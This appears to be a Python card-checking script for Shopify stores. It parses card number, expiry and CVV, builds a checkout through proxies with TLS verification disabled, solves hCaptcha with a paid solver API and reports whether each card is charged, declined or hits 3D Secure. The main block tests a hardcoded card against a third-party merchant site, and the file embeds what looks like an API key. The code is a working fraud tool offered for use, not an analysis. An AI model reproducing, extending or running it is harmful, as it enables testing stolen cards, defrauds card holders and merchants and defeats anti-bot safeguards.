import sys, json, time, re, urllib3, requests
...
class ShopProcessor:
    def __init__(self):
        ...
        self._deposit_url = "https://deposit.shopifycs.com/sessions"
        self._checkout_origin = "https://checkout.shopifycs.com"
        self._nopecha_key = "sub_1T2WdACRwBwvt6ptOS7dRb3Q"  # Your NopeCHA API key

    def _find_between(self, content, start, end):
        try:
    ...
    def _get_minimum_price_product_details(self, json_data):
        try:
    ...
    def _get_address_details(self, country_code):
        if country_code == 'US':
            return {
    ...
    def _parse_proxy(self, proxy_str):
        if not proxy_str:
            return None
        http_match = re.match(r'https?://([^:]+):([^@]+)@([^:]+:\d+)', proxy_str)
        if http_match:
            user, password, hostport = http_match.groups()
            return {
                'http': f'http://{user}:{password}@{hostport}',
                'https': f'http://{user}:{password}@{hostport}'
            }
        at_match = re.match(r'([^:]+):([^@]+)@([^:]+:\d+)', proxy_str)
        if at_match:
            user, password, hostport = at_match.groups()
            return {
                'http': f'http://{user}:{password}@{hostport}',
                'https': f'http://{user}:{password}@{hostport}'
            }
    ...
    # ============================================================================
    # NopeCHA Captcha Solver (raw API, same as test)
    # ============================================================================
    def _solve_captcha(self, sitekey, page_url, captcha_type='hcaptcha'):
        """
        Solve hCaptcha (or reCAPTCHA) using NopeCHA API.
        Returns token or None if failed.
        """
        print(f"[CAPTCHA] Solving {captcha_type} with sitekey: {sitekey}")
        try:
            # 1. Submit job
            submit_url = "https://api.nopecha.com/token"
            payload = {
                'key': self._nopecha_key,
                'type': captcha_type,
                'sitekey': sitekey,
                'url': page_url
            }
            ...
            if resp.status_code != 200:
                print(f"[CAPTCHA] HTTP error: {resp.status_code}")
                return None
            result = resp.json()
            job_id = result.get("data")
            if not job_id:
                print(f"[CAPTCHA] Error from NopeCHA: {result.get('message', result)}")
                return None
            print(f"[CAPTCHA] Job started: {job_id}")

            # 2. Poll for result
            poll_url = f"https://api.nopecha.com/token?key={self._nopecha_key}&id={job_id}"
            ...
            for _ in range(max_attempts):
                ...
                if "data" in status:
                    token = status["data"]
                    if token:
                        print(f"[CAPTCHA] Token received: {token[:30]}...")
                        return token
                elif status.get("error") == 14:  # still solving
                    continue
                else:
                    print(f"[CAPTCHA] Solve failed: {status}")
                    return None
    ...
    def process(self, cc_input, site_input, proxyin):
        max_retries = 5
        retry_count = 0
        result = {
        ...
        try:
            ...
            proxies = self._parse_proxy(proxyin)
            cc = cc_parts[0]
            month = cc_parts[1]
            year = cc_parts[2]
            cvv = cc_parts[3]
            ...
            try:
                response = requests.get(products_url, headers=headers, timeout=15, verify=False, proxies=proxies)
                response.raise_for_status()
                product_details = self._get_minimum_price_product_details(response.text)
                ...
                result['Response'] = f'Error in request: {str(e)}'
                return json.dumps(result)
            except Exception as e:
            ...
            while retry_count < max_retries:
                try:
                    ...
                    response = requests.get(cart_url, headers=headers, cookies={'cookie': 'cookie.txt'}, timeout=15, verify=False, proxies=proxies)
                    response.raise_for_status()
                    ...
                    address_details = self._get_address_details(country_code)
                    final_url = response.url
                    checkout_token_match = self._find_between(final_url, '/cn/', '?')
                    if not checkout_token_match:
                        raise ValueError("Checkout token not found in redirect URL")
                    web_build_id = self._find_between(response.text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;}')
                    if not web_build_id:
                        raise ValueError("Web build id not found")
                    x_checkout_one_session_token = self._find_between(response.text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
                    if not x_checkout_one_session_token:
                        raise ValueError("Session token not found")
                    queue_token = self._find_between(response.text, 'queueToken&quot;:&quot;', '&quot;')
                    if not queue_token:
                        raise ValueError("Queue token not found")
                    stable_id = self._find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
                    if not stable_id:
                        raise ValueError("Stable ID not found")
                    payment_method_identifier = self._find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                    ...
                    token_headers = {
                        ...
                        'origin': self._checkout_origin,
                        'referer': f'{self._checkout_origin}/',
                        'user-agent': self._ua
                    }
                    payload = {
                        "credit_card": {
                        ...
                        "payment_session_scope": parsed_url.hostname
                    }
                    response = requests.post(self._deposit_url, headers=token_headers, json=payload, timeout=15, verify=False, proxies=proxies)
                    response.raise_for_status()
            ...
            try:
                ...
                address = self._get_address_details(country_code)
                propayload = {
                ...
                if gateway_info:
                    ...
                    gateway_result = f"Shopify + {gateway}" if gateway != "Shopify Payments" else "Normal"
                else:
                ...
                if not seller_proposal:
                    if retry_count < max_retries:
                        retry_count += 1
                        raise Exception("Seller proposal not found.")
                    else:
                        result = {
                            'Response': 'Shipping info is empty'
                        }
                        return json.dumps(result)
                ...
                if not handle:
                    if retry_count < max_retries:
                        retry_count += 1
                        raise Exception("Handle is empty")
                    else:
                        result = {
                            'Response': 'Handle is empty after all attempts'
                        }
                        return json.dumps(result)
                ...
                if not delivery_amount:
                    if retry_count < max_retries:
                        retry_count += 1
                        raise Exception("Delivery amount is empty")
                    else:
                        result = {
                            'Response': 'Delivery rates are empty'
                        }
                        return json.dumps(result)
                ...
                if not tax:
                    if retry_count < max_retries:
                        retry_count += 1
                        raise Exception("Tax is empty")
                    else:
                        result = {
                            'Response': 'Tax is empty after all attempts'
                        }
                        return json.dumps(result)
                total_amount = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", "")
            except Exception as e:
                result = {
                    'Response': f'Proposal step failed: {str(e)}'
                }
                return json.dumps(result)

            # ====================================================================
            # SUBMIT FOR COMPLETION (WITH CAPTCHA HANDLING)
            # ====================================================================
            try:
                headers = {
                    'accept': 'application/json',
                ...
                # Function to build input_data (includes captcha if token available)
                def make_input_data(captcha_token=None, sitekey=None):
                    input_data = {
                ...
                while retry_count < max_retries:
                    # Build fresh input_data (may include captcha token if we have one)
                    input_data = make_input_data(captcha_token, sitekey)
                    payload = {
                    ...
                    if 'CAPTCHA_METADATA_MISSING' in response_text:
                        # Extract sitekey
                        sitekey_match = re.search(r'data-sitekey="([^"]+)"', response_text)
                        if not sitekey_match:
                            sitekey_match = re.search(r'sitekey["\s:=]+["\']?([a-zA-Z0-9_-]+)', response_text)
                        if not sitekey_match:
                            result = {
                                'Response': 'CAPTCHA_DETECTED (no sitekey)'
                            }
                            return json.dumps(result)
                        sitekey = sitekey_match.group(1)
                        page_url = f"{base_url}/checkouts/cn/{checkout_token_match}"
                        captcha_token = self._solve_captcha(sitekey, page_url)
                        if not captcha_token:
                            result = {
                                'Response': 'CAPTCHA_SOLVING_FAILED'
                            }
                            return json.dumps(result)
                        retry_count += 1
                        continue
                ...
                result = {
                    "Response": str(e),
                    "Price": total_amount if 'total_amount' in locals() else "0.00"
                }
                return json.dumps(result)
            ...
            if receipt_id:
                try:
                    ...
                    elif 'CompletePaymentChallenge' in response_text or 'AUTHORIZATION_ERROR' in response_text or '/authentications/' in response_text:
                        result = {
                            'Response': '3DS Secure required',
                            'Price': total_amount,
                            'Gateway': gateway_result
                        }
...
if __name__ == "__main__":
    print(json.loads(ShopProcessor().process("5481900012362669|03|2029|533", "https://hoteldoggy.com", "Your proxy")))
